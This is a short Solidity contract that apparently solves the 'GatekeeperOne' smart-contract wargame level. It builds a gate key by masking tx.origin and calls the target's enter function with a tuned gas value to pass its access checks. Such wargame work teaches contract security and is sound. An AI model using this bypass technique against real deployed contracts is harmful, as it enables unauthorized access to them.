// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

import {GatekeeperOne} from "./GatekeeperOne.sol";
import {console} from "forge-std/Test.sol";

contract GatekeeperOneHacker {

  function hack(address gatekeeperAddr, uint256 gasOffset) public {
    GatekeeperOne gatekeeper = GatekeeperOne(gatekeeperAddr);
    bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
    gatekeeper.enter{gas: 50000 + gasOffset}(gateKey);
  }
}